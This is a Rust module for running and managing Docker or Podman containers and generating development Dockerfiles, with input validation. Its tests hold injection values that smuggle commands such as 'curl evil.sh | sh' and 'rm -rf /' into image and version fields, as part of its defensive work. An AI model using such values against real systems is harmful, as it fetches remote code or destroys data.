//! Container runtime integration (Docker/Podman)
//!
//! Provides:
//! - Auto-detection of Docker or Podman
//! - Run commands in containers with OMG environment
//! - Build development containers with runtime versions
//! - Interactive shell access to containers

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::process::{Command, Stdio};

/// Supported container runtimes
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ContainerRuntime {
    Docker,
    Podman,
}

impl ContainerRuntime {
    /// Get the command name for this runtime
    #[must_use]
    pub fn command(&self) -> &'static str {
        match self {
            Self::Docker => "docker",
            Self::Podman => "podman",
        }
    }

    /// Check if this runtime is available
    #[must_use]
    pub fn is_available(&self) -> bool {
        Command::new(self.command())
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .is_ok_and(|s| s.success())
    }
}

impl std::fmt::Display for ContainerRuntime {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Docker => write!(f, "Docker"),
            Self::Podman => write!(f, "Podman"),
        }
    }
}

/// Detect available container runtime (prefers Podman for rootless)
#[must_use]
pub fn detect_runtime() -> Option<ContainerRuntime> {
    // Prefer Podman (rootless by default, better security)
    if ContainerRuntime::Podman.is_available() {
        return Some(ContainerRuntime::Podman);
    }
    if ContainerRuntime::Docker.is_available() {
        return Some(ContainerRuntime::Docker);
    }
    None
}

/// Container configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainerConfig {
    /// Base image to use
    pub image: String,
    /// Container name (optional)
    pub name: Option<String>,
    /// Environment variables
    pub env: Vec<(String, String)>,
    /// Volume mounts (host:container)
    pub volumes: Vec<(String, String)>,
    /// Working directory inside container
    pub workdir: Option<String>,
    /// Whether to remove container after exit
    pub rm: bool,
    /// Whether to run interactively with TTY
    pub interactive: bool,
}

impl Default for ContainerConfig {
    fn default() -> Self {
        Self {
            image: "ubuntu:24.04".to_string(),
            name: None,
            env: Vec::new(),
            volumes: Vec::new(),
            workdir: None,
            rm: true,
            interactive: true,
        }
    }
}

/// Container manager for running commands in containers
pub struct ContainerManager {
    runtime: ContainerRuntime,
}

impl ContainerManager {
    /// Create a new container manager
    pub fn new() -> Result<Self> {
        let runtime =
            detect_runtime().context("No container runtime found. Install Docker or Podman.")?;
        Ok(Self { runtime })
    }

    /// Create with a specific runtime
    #[must_use]
    pub fn with_runtime(runtime: ContainerRuntime) -> Self {
        Self { runtime }
    }

    /// Run a command in a container and wait for it to exit
    pub fn run(&self, config: &ContainerConfig, command: &[&str]) -> Result<i32> {
        let status = self
            .build_run_command(config, command, false)?
            .status()
            .context("Failed to run container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Start a command in a background (detached) container.
    ///
    /// Unlike [`ContainerManager::run`], this passes `--detach` so the caller
    /// returns immediately; the runtime prints the container ID on stdout.
    /// See <https://docs.docker.com/reference/cli/docker/container/run/>.
    pub fn run_detached(&self, config: &ContainerConfig, command: &[&str]) -> Result<i32> {
        let status = self
            .build_run_command(config, command, true)?
            .status()
            .context("Failed to run detached container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Build the `docker/podman run` command for `config`.
    ///
    /// # Security
    /// Image and container names are validated against the shared allowlists
    /// before they ever reach the runtime argv. Image references legitimately
    /// contain ':' (tags/digests), so they need the image-reference grammar,
    /// not the package-name charset.
    fn build_run_command(
        &self,
        config: &ContainerConfig,
        command: &[&str],
        detach: bool,
    ) -> Result<Command> {
        crate::core::security::validate_image_ref(&config.image)?;
        if let Some(ref name) = config.name {
            crate::core::security::validate_package_name(name)?;
        }

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("run");

        if detach {
            cmd.arg("--detach");
        }

        if config.rm {
            cmd.arg("--rm");
        }

        if config.interactive {
            cmd.arg("-it");
        }

        if let Some(ref name) = config.name {
            cmd.args(["--name", name]);
        }

        if let Some(ref workdir) = config.workdir {
            cmd.args(["-w", workdir]);
        }

        for (key, value) in &config.env {
            cmd.args(["-e", &format!("{key}={value}")]);
        }

        for (host, container) in &config.volumes {
            cmd.args(["-v", &format!("{host}:{container}")]);
        }

        cmd.arg("--");
        cmd.arg(&config.image);
        cmd.args(command);

        Ok(cmd)
    }

    /// Run an interactive shell in a container
    pub fn shell(&self, config: &ContainerConfig) -> Result<i32> {
        self.run(config, &[detect_container_shell(&config.image)])
    }

    /// Execute a command in a running container
    pub fn exec(&self, container: &str, command: &[&str], interactive: bool) -> Result<i32> {
        // SECURITY: Validate container name
        crate::core::security::validate_package_name(container)?;

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("exec");

        if interactive {
            cmd.arg("-it");
        }

        cmd.arg("--");
        cmd.arg(container);
        cmd.args(command);

        let status = cmd.status().context("Failed to exec in container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Build a container image with advanced options
    pub fn build_with_options(
        &self,
        dockerfile: &Path,
        tag: &str,
        context: &Path,
        no_cache: bool,
        build_args: &[String],
        target: Option<&str>,
    ) -> Result<()> {
        // SECURITY: Same input hygiene as `run`: the tag follows the
        // image-reference grammar (`registry:port/name:tag` legitimately
        // contains ':'), and a multi-stage target must be a plain stage name.
        // See <https://docs.docker.com/build/building/multi-stage/>.
        crate::core::security::validate_image_ref(tag)?;
        if let Some(t) = target {
            crate::core::security::validate_package_name(t)?;
        }
        for arg in build_args {
            if arg.chars().any(char::is_control) {
                anyhow::bail!("Invalid build argument {arg:?}: control characters are not allowed");
            }
        }

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("build");
        cmd.args(["-f", &dockerfile.display().to_string()]);
        cmd.args(["-t", tag]);

        if no_cache {
            cmd.arg("--no-cache");
        }

        for arg in build_args {
            cmd.args(["--build-arg", arg]);
        }

        if let Some(t) = target {
            cmd.args(["--target", t]);
        }

        cmd.arg("--");
        cmd.arg(context.display().to_string());

        let status = cmd.status().context("Failed to build container")?;
        if !status.success() {
            anyhow::bail!("Container build failed with exit code: {:?}", status.code());
        }
        Ok(())
    }

    /// List running containers
    pub fn list_running(&self) -> Result<Vec<ContainerInfo>> {
        let output = Command::new(self.runtime.command())
            .args([
                "ps",
                "--format",
                "{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}",
            ])
            .output()
            .context("Failed to list containers")?;
        let output = require_successful_output(output, "Container listing")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let containers = stdout
            .lines()
            .filter_map(|line| {
                parse_listing_line(line, 4).map(|parts| ContainerInfo {
                    id: parts[0].to_string(),
                    name: parts[1].to_string(),
                    image: parts[2].to_string(),
                    status: parts[3].to_string(),
                })
            })
            .collect();

        Ok(containers)
    }

    /// Stop a running container
    pub fn stop(&self, container: &str) -> Result<()> {
        // SECURITY: Validate container name
        crate::core::security::validate_package_name(container)?;

        let status = Command::new(self.runtime.command())
            .args(["stop", "--", container])
            .status()
            .context("Failed to stop container")?;

        if !status.success() {
            anyhow::bail!("Failed to stop container: {container}");
        }
        Ok(())
    }

    /// Pull an image
    pub fn pull(&self, image: &str) -> Result<()> {
        // SECURITY: Validate image reference
        crate::core::security::validate_image_ref(image)?;

        let status = Command::new(self.runtime.command())
            .args(["pull", "--", image])
            .status()
            .context("Failed to pull image")?;

        if !status.success() {
            anyhow::bail!("Failed to pull image: {image}");
        }
        Ok(())
    }

    /// List available images
    pub fn list_images(&self) -> Result<Vec<ImageInfo>> {
        let output = Command::new(self.runtime.command())
            .args([
                "images",
                "--format",
                "{{.Repository}}\t{{.Tag}}\t{{.ID}}\t{{.Size}}",
            ])
            .output()
            .context("Failed to list images")?;
        let output = require_successful_output(output, "Image listing")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let images = stdout
            .lines()
            .filter_map(|line| {
                parse_listing_line(line, 4).map(|parts| ImageInfo {
                    repository: parts[0].to_string(),
                    tag: parts[1].to_string(),
                    id: parts[2].to_string(),
                    size: parts[3].to_string(),
                })
            })
            .collect();

        Ok(images)
    }

    /// Generate a Dockerfile for OMG development environment
    ///
    /// All interpolated inputs are validated against allowlist charsets
    /// before any formatting: `base_image` must be a plain image reference,
    /// runtime names must pass [`validate_package_name`], and versions must
    /// pass [`validate_version`]. Invalid values never reach the generated
    /// text; they are replaced with safe fallbacks (or the runtime entry is
    /// skipped) and reported via `tracing::warn!`.
    pub fn generate_dockerfile(&self, base_image: &str, runtimes: &[(&str, &str)]) -> String {
        let base_image = normalized_base_image(base_image);

        let mut dockerfile = format!("FROM {base_image}\n\n");
        dockerfile.push_str("# OMG Development Environment\n");
        dockerfile.push_str("LABEL maintainer=\"OMG Team\"\n\n");

        // Install common dependencies based on base image
        if base_image.contains("ubuntu") || base_image.contains("debian") {
            dockerfile.push_str("RUN apt-get update && apt-get install -y \\\n");
            dockerfile.push_str("    curl wget git build-essential ca-certificates \\\n");
            dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
        } else if base_image.contains("arch") {
            dockerfile.push_str("RUN pacman -Syu --noconfirm && pacman -S --noconfirm \\\n");
            dockerfile.push_str("    curl wget git base-devel\n\n");
        } else if base_image.contains("alpine") {
            dockerfile.push_str("RUN apk add --no-cache \\\n");
            dockerfile.push_str("    curl wget git build-base\n\n");
        }

        // Install runtimes
        for (runtime, version) in runtimes {
            if let Err(error) = crate::core::security::validate_package_name(runtime) {
                tracing::warn!("Skipping runtime {runtime:?} in generated Dockerfile: {error}");
                continue;
            }
            let version = if version.is_empty() {
                String::new()
            } else if let Err(error) = crate::core::security::validate_version(version) {
                tracing::warn!(
                    "Replacing unsafe version {version:?} for runtime {runtime}: {error}"
                );
                "latest".to_string()
            } else {
                (*version).to_string()
            };
            let version = version.as_str();
            if !is_debian_base(base_image)
                && let Some(package) = runtime_system_package(base_image, runtime, version)
            {
                push_package_install(&mut dockerfile, base_image, &package);
                continue;
            }
            match *runtime {
                "node" => {
                    dockerfile.push_str("# Install Node.js\n");
                    dockerfile.push_str("ENV NODE_VERSION=");
                    // The NodeSource setup script only accepts a numeric major
                    // version; alias symbolic requests to the supported LTS
                    // major. https://github.com/nodesource/distributions
                    let node_major = version
                        .split('.')
                        .next()
                        .filter(|major| major.chars().all(|c| c.is_ascii_digit()))
                        .unwrap_or("20");
                    dockerfile.push_str(node_major);
                    dockerfile.push('\n');
                    dockerfile.push_str("RUN curl -fsSL -o /tmp/nodesource-setup.sh https://deb.nodesource.com/setup_${NODE_VERSION}.x \\\n");
                    dockerfile.push_str("    && bash /tmp/nodesource-setup.sh \\\n");
                    dockerfile.push_str("    && rm -f /tmp/nodesource-setup.sh \\\n");
                    dockerfile.push_str("    && apt-get install -y nodejs \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                "python" => {
                    dockerfile.push_str("# Install Python\n");
                    dockerfile.push_str("ENV PYTHON_VERSION=");
                    dockerfile.push_str(version);
                    dockerfile.push('\n');
                    dockerfile.push_str("RUN apt-get update && apt-get install -y \\\n");
                    dockerfile.push_str("    python3 python3-pip python3-venv \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/* \\\n");
                    dockerfile.push_str("    && ln -sf /usr/bin/python3 /usr/bin/python\n\n");
                }
                "rust" => {
                    dockerfile.push_str("# Install Rust\n");
                    dockerfile.push_str("ENV RUSTUP_HOME=/usr/local/rustup \\\n");
                    dockerfile.push_str("    CARGO_HOME=/usr/local/cargo \\\n");
                    dockerfile.push_str("    PATH=/usr/local/cargo/bin:$PATH\n");
                    // rustup requires a non-empty toolchain name; fall back to
                    // the stable channel for unspecified/symbolic versions.
                    // https://rust-lang.github.io/rustup/concepts/toolchains.html
                    let toolchain = match version {
                        "" | "latest" => "stable",
                        other => other,
                    };
                    dockerfile.push_str("RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain ");
                    dockerfile.push_str(toolchain);
                    dockerfile.push_str("\n\n");
                }
                "go" => {
                    dockerfile.push_str("# Install Go\n");
                    // The tarball URL embeds the version, so it must be a real
                    // release number, never empty or "latest".
                    // https://go.dev/doc/install
                    let go_ver = if version.is_empty() || version == "latest" {
                        "1.22"
                    } else {
                        version
                    };
                    dockerfile.push_str("ENV GO_VERSION=");
                    dockerfile.push_str(go_ver);
                    dockerfile.push('\n');
                    dockerfile.push_str("RUN curl -fsSL https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz | tar -C /usr/local -xzf - \\\n");
                    dockerfile.push_str("    && ln -sf /usr/local/go/bin/go /usr/local/bin/go\n");
                    dockerfile.push_str("ENV PATH=$PATH:/usr/local/go/bin\n\n");
                }
                "bun" => {
                    dockerfile.push_str("# Install Bun\n");
                    dockerfile.push_str("RUN curl -fsSL https://bun.sh/install | bash\n");
                    dockerfile.push_str("ENV PATH=$PATH:/root/.bun/bin\n\n");
                }
                "java" => {
                    dockerfile.push_str("# Install Java\n");
                    let java_pkg = version
                        .split('.')
                        .next()
                        .filter(|major| major.chars().all(|c| c.is_ascii_digit()))
                        .map_or_else(
                            || "default-jdk".to_string(),
                            |major| format!("openjdk-{major}-jdk"),
                        );
                    dockerfile.push_str("RUN apt-get update && apt-get install -y ");
                    dockerfile.push_str(&java_pkg);
                    dockerfile.push_str(" \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                "ruby" => {
                    dockerfile.push_str("# Install Ruby\n");
                    let ruby_components: Vec<&str> = version
                        .split('.')
                        .take(2)
                        .filter(|component| component.chars().all(|c| c.is_ascii_digit()))
                        .collect();
                    let ruby_pkg = if ruby_components.is_empty() {
                        "ruby-full".to_string()
                    } else {
                        format!("ruby{}", ruby_components.join("."))
                    };
                    dockerfile.push_str("RUN apt-get update && apt-get install -y ");
                    dockerfile.push_str(&ruby_pkg);
                    dockerfile.push_str(" \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                _ => {
                    // Attempt to install as system package based on distribution
                    push_package_install(&mut dockerfile, base_image, runtime);
                    if !push_package_install_supported(base_image) {
                        use std::fmt::Write as _;
                        let _ = writeln!(
                            dockerfile,
                            "# Please manually install {runtime} {version} using your distribution's package manager"
                        );
                    }
                }
            }
        }

        dockerfile.push_str("WORKDIR /app\n\n");
        dockerfile.push_str("# Copy project files\n");
        dockerfile.push_str("COPY . .\n\n");
        dockerfile.push_str("CMD [\"/bin/bash\"]\n");

        dockerfile
    }
}

/// Whether an image reference consists only of safe Docker-reference
/// characters. Anything else (shell metacharacters, whitespace, option-like
/// prefixes, traversal) must never reach a generated Dockerfile.
pub(crate) fn normalized_base_image(image: &str) -> &str {
    if is_safe_image_reference(image) {
        image
    } else {
        tracing::warn!("Refusing unsafe base image {image:?}; falling back to ubuntu:24.04");
        "ubuntu:24.04"
    }
}

fn is_safe_image_reference(image: &str) -> bool {
    crate::core::security::validate_image_ref(image).is_ok()
}

/// Whether [`push_package_install`] knows how to emit an install line for
/// this base-image family.
fn is_debian_base(base_image: &str) -> bool {
    base_image.contains("ubuntu") || base_image.contains("debian")
}

fn push_package_install_supported(base_image: &str) -> bool {
    is_debian_base(base_image)
        || base_image.contains("arch")
        || base_image.contains("alpine")
        || base_image.contains("fedora")
        || base_image.contains("rhel")
        || base_image.contains("centos")
        || base_image.contains("opensuse")
}

fn runtime_system_package(base_image: &str, runtime: &str, version: &str) -> Option<String> {
    match runtime {
        "node" => Some("nodejs".to_string()),
        "python" if base_image.contains("arch") => Some("python".to_string()),
        "python" => Some("python3".to_string()),
        "java" if base_image.contains("arch") => Some("jdk-openjdk".to_string()),
        "java" if base_image.contains("alpine") => {
            let major = version.split('.').next().filter(|part| {
                !part.is_empty() && part.chars().all(|character| character.is_ascii_digit())
            });
            Some(format!("openjdk{}", major.unwrap_or("21")))
        }
        "java"
            if base_image.contains("fedora")
                || base_image.contains("rhel")
                || base_image.contains("centos")
                || base_image.contains("opensuse") =>
        {
            let major = version.split('.').next().filter(|part| {
                !part.is_empty() && part.chars().all(|character| character.is_ascii_digit())
            });
            Some(format!("java-{}-openjdk-devel", major.unwrap_or("21")))
        }
        "java" => Some("java".to_string()),
        "ruby" => Some("ruby".to_string()),
        _ => None,
    }
}

/// Append the distribution-appropriate package-install command for `package`
/// to a generated Dockerfile. Emits a warning comment for unknown base-image
/// families instead of guessing a package manager.
fn push_package_install(dockerfile: &mut String, base_image: &str, package: &str) {
    use std::fmt::Write as _;

    let _ = writeln!(dockerfile, "# Install {package}");
    if base_image.contains("ubuntu") || base_image.contains("debian") {
        let _ = writeln!(
            dockerfile,
            "RUN apt-get update && apt-get install -y {package} && rm -rf /var/lib/apt/lists/*\n"
        );
    } else if base_image.contains("arch") {
        let _ = writeln!(dockerfile, "RUN pacman -S --noconfirm {package}\n");
    } else if base_image.contains("alpine") {
        let _ = writeln!(dockerfile, "RUN apk add --no-cache {package}\n");
    } else if base_image.contains("fedora")
        || base_image.contains("rhel")
        || base_image.contains("centos")
    {
        let _ = writeln!(
            dockerfile,
            "RUN dnf install -y {package} && dnf clean all\n"
        );
    } else if base_image.contains("opensuse") {
        let _ = writeln!(
            dockerfile,
            "RUN zypper install -y {package} && zypper clean\n"
        );
    } else {
        let _ = writeln!(
            dockerfile,
            "# WARNING: Unknown base image '{base_image}' - package installation not automated"
        );
        let _ = writeln!(
            dockerfile,
            "# Supported base images: ubuntu, debian, arch, alpine, fedora, rhel, centos, opensuse\n"
        );
    }
}

/// Split one tab-separated `--format` output line from the runtime.
///
/// Lines without the expected column count are reported via `tracing::warn!`
/// and skipped instead of being dropped silently.
fn parse_listing_line(line: &str, expected_columns: usize) -> Option<Vec<&str>> {
    let parts: Vec<&str> = line.split('\t').collect();
    if parts.len() < expected_columns {
        if !line.is_empty() {
            tracing::warn!(
                "Skipping malformed runtime listing line (expected {expected_columns} columns): {line:?}"
            );
        }
        return None;
    }
    Some(parts)
}

fn require_successful_output(
    output: std::process::Output,
    operation: &str,
) -> Result<std::process::Output> {
    if output.status.success() {
        return Ok(output);
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    anyhow::bail!(
        "{operation} failed with status {:?}: {}",
        output.status.code(),
        stderr.trim()
    );
}

/// Information about a running container
#[derive(Debug, Clone)]
pub struct ContainerInfo {
    pub id: String,
    pub name: String,
    pub image: String,
    pub status: String,
}

/// Information about a container image
#[derive(Debug, Clone)]
pub struct ImageInfo {
    pub repository: String,
    pub tag: String,
    pub id: String,
    pub size: String,
}

/// Detect the best shell for a container image
fn detect_container_shell(image: &str) -> &'static str {
    if image.contains("alpine") {
        "/bin/sh"
    } else {
        "/bin/bash"
    }
}

fn development_container_name(project_dir: &Path) -> String {
    let project_name = project_dir
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("omg");
    let mut sanitized = String::with_capacity(project_name.len().min(251));
    for character in project_name.chars() {
        if sanitized.len() >= 251 {
            break;
        }
        if character.is_ascii_alphanumeric() || matches!(character, '.' | '_' | '-') {
            sanitized.push(character);
        } else if !sanitized.ends_with('-') {
            sanitized.push('-');
        }
    }
    let sanitized = sanitized.trim_matches(['.', '_', '-']);
    let project_name = if sanitized.is_empty() {
        "omg"
    } else {
        sanitized
    };
    format!("{project_name}-dev")
}

/// Create a development container config for the current project
pub fn dev_container_config(project_dir: &Path) -> ContainerConfig {
    ContainerConfig {
        image: "ubuntu:24.04".to_string(),
        name: Some(development_container_name(project_dir)),
        env: vec![("TERM".to_string(), "xterm-256color".to_string())],
        volumes: vec![(project_dir.display().to_string(), "/app".to_string())],
        workdir: Some("/app".to_string()),
        rm: true,
        interactive: true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dev_container_config_sanitizes_project_directory_name() {
        let config = dev_container_config(Path::new("/workspace/My Project!"));

        assert_eq!(config.name.as_deref(), Some("My-Project-dev"));
    }

    #[test]
    fn test_container_config_default() {
        let config = ContainerConfig::default();
        assert_eq!(config.image, "ubuntu:24.04");
        assert!(config.rm);
        assert!(config.interactive);
    }

    #[test]
    fn test_generate_dockerfile() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("node", "20.10.0")]);
        assert!(dockerfile.contains("FROM ubuntu:24.04"));
        // Check for Node.js installation (new format installs runtimes)
        assert!(dockerfile.contains("Install Node.js") || dockerfile.contains("NODE_VERSION"));
    }

    #[cfg(unix)]
    #[test]
    fn failed_container_command_is_not_reported_as_an_empty_result() {
        let output = std::process::Command::new("sh")
            .args(["-c", "printf 'daemon unavailable' >&2; exit 17"])
            .output()
            .expect("run failure fixture");

        let error = require_successful_output(output, "Container listing")
            .expect_err("non-zero container command must fail");

        assert!(error.to_string().contains("status Some(17)"));
        assert!(error.to_string().contains("daemon unavailable"));
    }

    #[test]
    fn non_debian_runtime_installs_use_the_base_image_package_manager() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager.generate_dockerfile(
            "archlinux:latest",
            &[
                ("node", "lts"),
                ("python", "3.12"),
                ("java", "21"),
                ("ruby", "3.3"),
            ],
        );

        assert!(!dockerfile.contains("apt-get"), "{dockerfile}");
        for package in ["nodejs", "python", "jdk-openjdk", "ruby"] {
            assert!(
                dockerfile.contains(&format!("pacman -S --noconfirm {package}")),
                "missing {package}: {dockerfile}"
            );
        }
    }

    #[test]
    fn test_generate_dockerfile_generic() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        // Test generic package installation (e.g. gcc)
        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("gcc", "latest")]);
        assert!(dockerfile.contains("apt-get install -y gcc"));

        let dockerfile_arch = manager.generate_dockerfile("archlinux:latest", &[("vim", "latest")]);
        assert!(dockerfile_arch.contains("pacman -S --noconfirm vim"));
    }

    #[test]
    fn unsafe_base_image_normalizes_to_the_reported_fallback() {
        assert_eq!(
            normalized_base_image("ubuntu:24.04\nRUN evil"),
            "ubuntu:24.04"
        );
        assert_eq!(normalized_base_image("alpine:3.21"), "alpine:3.21");
    }

    #[test]
    fn generate_dockerfile_never_emits_injected_base_image() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        for evil in [
            "ubuntu:24.04 && RUN curl evil.sh | sh",
            "ubuntu\nRUN malicious",
            "$HOME",
            "-flag",
            "../../etc",
            "",
        ] {
            let dockerfile = manager.generate_dockerfile(evil, &[]);
            assert!(
                dockerfile.starts_with("FROM ubuntu:24.04\n"),
                "base image {evil:?}"
            );
            assert!(!dockerfile.contains("evil"), "base image {evil:?}");
            assert!(!dockerfile.contains("malicious"), "base image {evil:?}");
        }
    }

    #[test]
    fn generate_dockerfile_never_emits_injected_versions_or_runtime_names() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("node", "20; rm -rf /")]);
        // Note: the legitimate cleanup line `rm -rf /var/lib/apt/lists/*`
        // exists in every Debian/Ubuntu Dockerfile, so assert on the
        // injected payload fragments instead.
        assert!(
            !dockerfile.contains("20;"),
            "version injection must be replaced"
        );
        assert!(
            !dockerfile.contains("NODE_VERSION=latest;"),
            "injected version must never survive"
        );

        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("pkg; curl evil", "1.0")]);
        assert!(
            !dockerfile.contains("curl evil") && !dockerfile.contains("install -y pkg;"),
            "runtime-name injection must be skipped entirely"
        );
    }

    #[test]
    fn generate_dockerfile_accepts_valid_inputs_unchanged() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager.generate_dockerfile(
            "debian:bookworm-slim",
            &[("node", "20.10.0"), ("go", "1.22.5")],
        );
        assert!(dockerfile.contains("FROM debian:bookworm-slim\n"));
        assert!(dockerfile.contains("NODE_VERSION=20"));
        assert!(dockerfile.contains("GO_VERSION=1.22.5"));
        assert!(!dockerfile.contains("curl -fsSL https://deb.nodesource.com"));
    }

    #[test]
    fn debian_runtime_packages_normalize_dotted_versions() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile =
            manager.generate_dockerfile("ubuntu:24.04", &[("java", "17.0.12"), ("ruby", "3.1.2")]);

        assert!(dockerfile.contains("apt-get install -y openjdk-17-jdk"));
        assert!(dockerfile.contains("apt-get install -y ruby3.1"));
        assert!(!dockerfile.contains("openjdk-17.0.12"));
        assert!(!dockerfile.contains("ruby3.1.2"));
    }
}
